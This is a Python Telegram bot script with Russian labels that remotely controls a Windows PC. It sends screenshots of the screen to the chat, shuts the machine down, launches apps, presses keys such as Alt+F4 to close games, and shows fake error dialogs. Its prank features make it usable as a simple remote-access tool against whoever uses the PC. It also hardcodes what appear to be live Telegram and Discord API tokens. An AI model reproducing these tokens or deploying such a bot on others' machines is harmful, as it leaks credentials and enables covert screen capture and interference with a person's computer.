import os
import telebot
import tempfile
from PIL import ImageGrab
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import keyboard as keyb
from tkinter import messagebox
import discord
from discord.ext import commands

API_TOKEN = '6103891377:AAHhSozEUcYNxiqbglMINamng14doycodu4'
DISCORD_TOKEN = 'ODA4MDE5MjkwNzY2ODM1Nzgy.GdYYZF.VhR0r_QrCOCxpsOmS84DKJcdtXD-KMywSrntew'

# client = discord.Intents()
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    b1 = ("Получить скриншот")
    b2 = ("Выключить")
    markup.row(b1, b2)
    b3 = ("Открыть стим")
    b4 = ("Открыть дискорд")
    markup.row(b3, b4)
    b5 = ("Открыть хром")
    b6 = ("Создать новую вкладку")
    markup.row(b5, b6)
    b7 = ("Фейк ошибка")
    b8 = ("Закрыть вкладку")
    markup.row(b7, b8)
    b9 = ("Закрыть игру")
    # b10 = ('Выйти из дискорд аккаунта')
    markup.row(b9)#, b10)
    bot.send_message(message.chat.id, '👋', reply_markup=markup)

@bot.message_handler(regexp='выключить')
def echo_message(message):
    bot.send_message(message.chat.id, 'Выключаю...')
    os.system("shutdown -s -t 0")

@bot.message_handler(regexp='получить скриншот')
def echo_message(message):
    path = tempfile.gettempdir() + 'screenshot.png'
    screenshot = ImageGrab.grab()
    screenshot.save(path, 'PNG')
    bot.send_photo(message.chat.id, open(path, 'rb'))

@bot.message_handler(regexp='открыть стим')
def echo_message(message):
    bot.send_message(message.chat.id, 'Открываю..')
    os.system('"C:/Program Files (x86)/Steam/steam.exe"')

@bot.message_handler(regexp='открыть дискорд')
def echo_message(message):
    bot.send_message(message.chat.id, 'Открываю..')
    os.system('"C:/Users/User/AppData/Local/Discord/app-1.0.9016/Discord.exe"')


@bot.message_handler(regexp='открыть хром')
def echo_message(message):
    bot.send_message(message.chat.id, 'Открываю..')
    os.system('"C:/Program Files/Google/Chrome/Application/chrome.exe"')


@bot.message_handler(regexp='Создать новую вкладку')
def echo_message(message):
    bot.send_message(message.chat.id, 'Создаю..')
    keyb.press('ctrl + t')
    keyb.release('ctrl + t')

@bot.message_handler(regexp='Закрыть вкладку')
def echo_message(message):
    bot.send_message(message.chat.id, 'Закрываю..')
    keyb.press('ctrl + w')
    keyb.release('ctrl + w')


@bot.message_handler(regexp='Фейк ошибка')
def echo_message(message):
    bot.send_message(message.chat.id, 'Кидаю фейк ошибку..')
    messagebox.showerror("Ошибка!", "Возникла неизвестная ошибка")


@bot.message_handler(regexp='Закрыть игру')
def echo_message(message):
    bot.send_message(message.chat.id, 'Закрываю игру..')
    keyb.press('alt + F4')
    keyb.release('alt + F4')


bot.polling(non_stop=True)